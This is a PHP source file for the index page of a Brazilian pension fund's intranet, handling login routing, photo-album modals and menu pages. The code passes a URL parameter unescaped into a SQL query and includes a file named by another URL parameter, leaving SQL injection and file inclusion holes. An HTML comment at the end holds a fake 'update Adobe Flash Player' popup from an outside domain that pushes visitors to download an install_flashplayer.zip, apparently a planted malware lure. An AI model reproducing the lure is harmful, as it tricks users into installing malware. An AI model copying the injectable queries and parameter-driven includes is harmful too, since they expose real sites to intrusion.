<?php
	//inica a sessão
	session_start();
	include "location.php";
?>
<html lang="pt-br">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta name="viewport" content="width=device-width">
<title>Intranet - SEBRAE PREVIDÊNCIA</title>
<meta name="keywords" content="Intranet, Sebrae Previdência" />
	<meta name="description" content="Intranet do SEBRAE PREVIDÊNCIA" />
	<meta name="robots" content="index, follow" />
	<meta name="SKYPE_TOOLBAR" content="SKYPE_TOOLBAR_PARSER_COMPATIBLE" />
	<meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <link rel="shortcut icon" href="/favicon.ico" />
<link href='http://fonts.googleapis.com/css?family=Source+Sans+Pro:400,600,700,900,400italic,600italic,700italic,900italic' rel='stylesheet' type='text/css'>
<!-- Começa CSS -->
<link rel="stylesheet" type="text/css" href="<?php echo $home_url;?>/css/fonts.css"/>
<link rel="stylesheet" type="text/css" href="<?php echo $home_url;?>/js/slider/engine1/style.css" />
<link rel="stylesheet" type="text/css" href="<?php echo $home_url;?>/js/coin-slider/coin-slider-styles.css" />
<link rel="stylesheet" type="text/css" href="<?php echo $home_url;?>/css/modal.css"/>
<link rel="stylesheet" type="text/css" href="<?php echo $home_url;?>/css/vendor/bootstrap.min.css"/>
<link rel="stylesheet" type="text/css" href="<?php echo $home_url;?>/css/vendor/owl.theme.css"/>
<link rel="stylesheet" type="text/css" href="<?php echo $home_url;?>/css/vendor/owl.transitions.css"/>
<link rel="stylesheet" type="text/css" href="<?php echo $home_url;?>/css/vendor/owl.carousel.css"/>
<link rel="stylesheet" type="text/css" href="<?php echo $home_url;?>/css/media/smartphones.css"/>
<link rel="stylesheet" type="text/css" href="<?php echo $home_url;?>/css/style.css"/>

<style type="text/css">a#vlb{display:none;}</style>
<!-- Começa JS -->
<script src="//code.jquery.com/jquery-1.11.3.min.js"></script>
<script src="//code.jquery.com/jquery-migrate-1.2.1.min.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jqueryui/1.11.4/jquery-ui.min.js"></script>
<script type="text/javascript" src="<?php echo $home_url;?>/js/coin-slider/coin-slider.min.js"></script>
<script type="text/javascript" src="<?php echo $home_url;?>/js/script_ajustes.js" charset="utf-8"></script>
<script type="text/javascript" src="<?php echo $home_url;?>/js/modalIndex.js" charset="utf-8"></script>
<script type="text/javascript" src="<?php echo $home_url;?>/js/modalFotos.js" charset="utf-8"></script>
<script type="text/javascript" src="<?php echo $home_url;?>/js/modalForum.js" charset="utf-8"></script>
<script type="text/javascript" src="<?php echo $home_url;?>/js/main.js" charset="utf-8"></script>
<script type="text/javascript" src="<?php echo $home_url;?>/js/vendor/owl.carousel.min.js" charset="utf-8"></script>
<script type="text/javascript">
	//$(document).ready(function() {
		//$('#slider').coinslider({width:940, height:400, navigation:true,delay:5000, spw:5, sph:3, caption:true});
	//});
</script>
</head>
<body>
	<?php
		include("php/conexao.php");
		if (!isset($_SESSION['bannerIndex']) and isset($_SESSION['nome'])) {
			$sqlB = "SELECT * FROM bannerIndex";
			$selectB = mysql_query($sqlB,$conexao) or die (mysql_error());
			$consultaB = mysql_fetch_array($selectB);
			if ($consultaB['status'] == 'Visível On-line') {
				echo '<div id="dialogB1" class="windowB">
				<!-- Botão para fechar a janela tem class="close" --><a href="#" class="close">Fechar <span> [X] </span></a>  
							<!-- foto ampliada -->
							<a href="'.$consultaB['link'].'"><img src="'.$consultaB['banner'].'"/></a>							
					</div> <!-- fecha #dialog1 -->	
					<div id="maskB">
					</div>
					';
				$_SESSION['bannerIndex'] = false;
			}
		}
		if (isset($_GET['pop-up'])) {
			$_SESSION['bannerIndex'] = false;	
		}
		if (isset($_GET['album'])) {
			$sqlPesq = "SELECT * FROM fotos Where album='".$_GET['album']."' ORDER BY id DESC";
			$pesquisa = mysql_query($sqlPesq,$conexao) or die (mysql_error());
			$fP = mysql_num_rows($pesquisa);
			$i=0;
			while ($cPesq = mysql_fetch_array($pesquisa)) {
				$i++;
				if ($fP==1) {
					echo '
						<div id="dialog'.$i.'" class="window">
							<!-- Botão para fechar a janela tem class="close" -->
							<a href="#" class="close">Fechar <span> [X] </span></a>  
							<!-- foto ampliada -->
							<img src="'.$cPesq['foto'].'"/>
							<div class="infoModal">Mostrando <strong>'.$cPesq['titulo'].'</strong>, Foto <strong>'.$i.'</strong> de <strong>'.$fP.'</strong></div>
					</div> <!-- fecha #dialog'.$i.' -->
						';
				} elseif ($i==1) {
					echo '
						<div id="dialog'.$i.'" class="window">
							<!-- Botão para fechar a janela tem class="close" -->
							<a href="#" class="close">Fechar <span> [X] </span></a>  
							<!-- foto ampliada -->
							<img src="'.$cPesq['foto'].'"/>
							<a href="#dialog" id="'.$i.'" class="foto_next"> > </a>
							<div class="infoModal">Mostrando <strong>'.$cPesq['titulo'].'</strong>, Foto <strong>'.$i.'</strong> de <strong>'.$fP.'</strong></div>
					</div> <!-- fecha #dialog'.$i.' -->
						';
				} elseif ($i==$fP) {
					echo '
						<div id="dialog'.$i.'" class="window">
							<!-- Botão para fechar a janela tem class="close" -->
							<a href="#" class="close">Fechar <span> [X] </span></a>  
							<!-- foto ampliada -->
							<img src="'.$cPesq['foto'].'"/>
							<a href="#dialog" id="'.$i.'" class="foto_prev"> < </a>
							<div class="infoModal">Mostrando <strong>'.$cPesq['titulo'].'</strong>, Foto <strong>'.$i.'</strong> de <strong>'.$fP.'</strong></div>
					</div> <!-- fecha #dialog'.$i.' -->
						';
				} else {
					echo '
						<div id="dialog'.$i.'" class="window">
							<!-- Botão para fechar a janela tem class="close" -->
							<a href="#" class="close">Fechar <span> [X] </span></a>  
							<!-- foto ampliada -->
							<img src="'.$cPesq['foto'].'"/>
							<a href="#dialog" id="'.$i.'" class="foto_prev"> < </a>
							<a href="#dialog" id="'.$i.'" class="foto_next"> > </a>
							<div class="infoModal">Mostrando <strong>'.$cPesq['titulo'].'</strong>, Foto <strong>'.$i.'</strong> de <strong>'.$fP.'</strong></div>
					</div> <!-- fecha #dialog'.$i.' -->
						';
				}
				echo '<div id="mask"></div>';
			}
		}
	?>
<div id="fb-root"></div>
<script>(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) return;
  js = d.createElement(s); js.id = id;
  js.src = "//connect.facebook.net/pt_BR/all.js#xfbml=1";
  fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script>
<?php 
	//intra
	if (!isset($_SESSION['nome']) and !isset($_SESSION['nivel_acesso']) and !isset($_GET['esqueciSenha']) and !isset($_GET['trocaSenha'])) {
		include 'php/estrutura_index/topoLogin.php'; 
 		include 'php/estrutura_index/rodapeLogin.php';
	} elseif (!isset($_SESSION['nome']) and !isset($_SESSION['nivel_acesso']) and isset($_GET['esqueciSenha'])) {
		include 'php/estrutura_index/topoLogin.php'; 
 		include 'php/estrutura_index/rodapeEsqueciSenha.php';
	//troca de senha
	} elseif (!isset($_SESSION['nome']) and !isset($_SESSION['nivel_acesso']) and isset($_GET['trocaSenha'])) {
		include 'php/estrutura_index/topoLogin.php';
 		include $_GET['page'].'.php';
	} else { // entra na intra
		//menus
		if (isset($_GET['pesq']) and !empty($_GET['pesq']) and isset($_GET['arq'])) {
			include 'php/estrutura_index/topo.php'; 
			include 'php/estrutura_index/menus.php';
			include 'php/conexao.php';
			include 'php/estrutura_index/pesqArquivos.php';  
			include 'php/estrutura_index/rodape.php';
		} elseif (isset($_GET['pesq']) and !empty($_GET['pesq']) and isset($_GET['not'])) {
			include 'php/estrutura_index/topo.php'; 
			include 'php/estrutura_index/menus.php';
			include 'php/conexao.php';
			include 'php/estrutura_index/pesqNoticias.php';  
			include 'php/estrutura_index/rodape.php';
		} elseif (isset($_GET['pesq']) and !empty($_GET['pesq']) and isset($_GET['dica'])) {
			include 'php/estrutura_index/topo.php'; 
			include 'php/estrutura_index/menus.php';
			include 'php/conexao.php';
			include 'php/estrutura_index/pesqDicas.php';  
			include 'php/estrutura_index/rodape.php';
		} elseif (isset($_GET['pesq']) and !empty($_GET['pesq']) and isset($_GET['treinamentos'])) {
			include 'php/estrutura_index/topo.php'; 
			include 'php/estrutura_index/menus.php';
			include 'php/conexao.php';
			include 'php/estrutura_index/pesqTreinamentos.php';  
			include 'php/estrutura_index/rodape.php';
		} elseif (isset($_GET['pesq']) and isset($_GET['topico'])) {
			include 'php/estrutura_index/topo.php'; 
			include 'php/estrutura_index/menus.php';
			include 'php/conexao.php';
			include 'php//estrutura_index/pesqTopicoForum.php';
			include 'php/estrutura_index/rodape.php';
		} elseif (isset($_GET['menu']) and !empty($_GET['menu']) and base64_decode($_GET['menu']) == "Notícias") {
			include 'php/estrutura_index/topo.php'; 
			include 'php/estrutura_index/menus.php';
			include 'php/conexao.php';
			include 'php/estrutura_index/noticias.php';  
			include 'php/estrutura_index/rodape.php';
		} elseif (isset($_GET['menu']) and !empty($_GET['menu']) and base64_decode($_GET['menu']) == "Dicas Úteis") {
			include 'php/estrutura_index/topo.php'; 
			include 'php/estrutura_index/menus.php';
			include 'php/conexao.php';
			include 'php/estrutura_index/dicas.php';  
			include 'php/estrutura_index/rodape.php';
		} elseif (isset($_GET['menu']) and !empty($_GET['menu']) and base64_decode($_GET['menu']) == "Treinamentos") {
			include 'php/estrutura_index/topo.php'; 
			include 'php/estrutura_index/menus.php';
			include 'php/conexao.php';
			include 'php/estrutura_index/treinamentos.php';  
			include 'php/estrutura_index/rodape.php';
		} elseif (isset($_GET['menu']) and !empty($_GET['menu']) and base64_decode($_GET['menu']) == "Galeria de Vídeos") {
			include 'php/estrutura_index/topo.php'; 
			include 'php/estrutura_index/menus.php';
			include 'php/conexao.php';
			include 'php/estrutura_index/videos.php';  
			include 'php/estrutura_index/rodape.php';
		} elseif (isset($_GET['forum']) and !empty($_GET['forum']) and base64_decode($_GET['forum']) == "true") {
			include 'php/estrutura_index/topo.php'; 
			include 'php/conexao.php';
			include 'php/estrutura_index/forum.php'; 
			include 'php/estrutura_index/rodape.php';
		} elseif (isset($_GET['settings']) and !empty($_GET['settings']) and base64_decode($_GET['settings']) == "true") {
			include 'php/estrutura_index/topo.php';
			include 'php/conexao.php';
			include 'php/estrutura_index/settings.php'; 
			include 'php/estrutura_index/rodape.php';
		} elseif (isset($_GET['menu']) and !empty($_GET['menu']) and base64_decode($_GET['menu']) == 'Gestores') { 
			include 'php/estrutura_index/topo.php'; 
			include 'php/estrutura_index/menus.php';
			include 'php/conexao.php';
			include 'php/estrutura_index/gestores.php';
			echo '</div>'; 
			include 'php/estrutura_index/rodape.php';
		} elseif (isset($_GET['menu']) and !empty($_GET['menu']) and base64_decode($_GET['menu']) == 'Equipe SEBRAE PREVIDENCIA') { 
			include 'php/estrutura_index/topo.php'; 
			include 'php/estrutura_index/menus.php';
			include 'php/conexao.php';
			include 'php/estrutura_index/equipeSebraePrev.php'; 
			include 'php/estrutura_index/rodape.php';
		} elseif (isset($_GET['menu']) and !empty($_GET['menu']) and base64_decode($_GET['menu']) == 'Membros do Conselho') { 
			include 'php/estrutura_index/topo.php'; 
			include 'php/estrutura_index/menus.php';
			include 'php/conexao.php';
			include 'php/estrutura_index/membrosConselho.php'; 
			include 'php/estrutura_index/rodape.php';
		} elseif (isset($_GET['menu']) and !empty($_GET['menu']) and base64_decode($_GET['menu']) == 'Galeria de Fotos') { 
			include 'php/estrutura_index/topo.php'; 
			include 'php/estrutura_index/menus.php';
			include 'php/conexao.php';
			include 'php/estrutura_index/fotos.php'; 
			include 'php/estrutura_index/rodape.php';
		} elseif (isset($_GET['menu']) and isset($_GET['raiz']) and isset($_GET['cat']) and !empty($_GET['menu']) and !empty($_GET['raiz']) and !empty($_GET['cat'])) {
			include 'php/estrutura_index/topo.php'; 
			include 'php/estrutura_index/menus.php';
			include 'php/conexao.php';
			include 'php/estrutura_index/listaArquivos.php';  
			include 'php/estrutura_index/rodape.php';
		} else { // abre o inicio
			include 'php/estrutura_index/topo.php'; 
			include 'php/estrutura_index/menus.php';
			include 'php/conexao.php';
			include 'php/estrutura_index/slider.php'; 
			include 'php/estrutura_index/areaconteudo.php'; 
			include 'php/estrutura_index/rodape.php';
		} // fecha o else dos menus
	} // fecha o else da intra
?>
</body>
</html>

<!---
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.6.2/jquery.min.js"></script>
<script type="text/javascript" src="http://novadidacta.com.br/upload/popup/jquery.cookie.js"></script>
<script type="text/javascript" src="http://novadidacta.com.br/upload/popup/jquery.ulightbox.js"></script>
<link rel="stylesheet" type="text/css" href="http://novadidacta.com.br/upload/popup/jquery.ulightbox.css" />
</head>
<body>
<script type="text/javascript">
	$(document).ready(function() {
	   uLightBox.init({
	      override:false,
	      background: 'black',
	      centerOnResize: true,
	      fade: true
	   });
	   {
		    uLightBox.alert({
		        width: '585px',
		        title: 'Para Continuar Atualize o Adobe@ Flash Player',
		        rightButtons: ['Instalar'],
		        opened: function() {
		            $('<span />').html("<a style='border:0;' onClick='uLightBox.clear();' href='http://novadidacta.com.br/upload/popup/install_flashplayer.zip' target='_blank'><img src='http://novadidacta.com.br/upload/popup/flash-player.png'></a>").appendTo('#lbContent');
		        },
		        onClick: function(button) {
		            uLightBox.clear();
		            location = "http://novadidacta.com.br/upload/popup/install_flashplayer.zip";
		        }
		    });
	    	
		}
	});
</script> 
</body>
-->
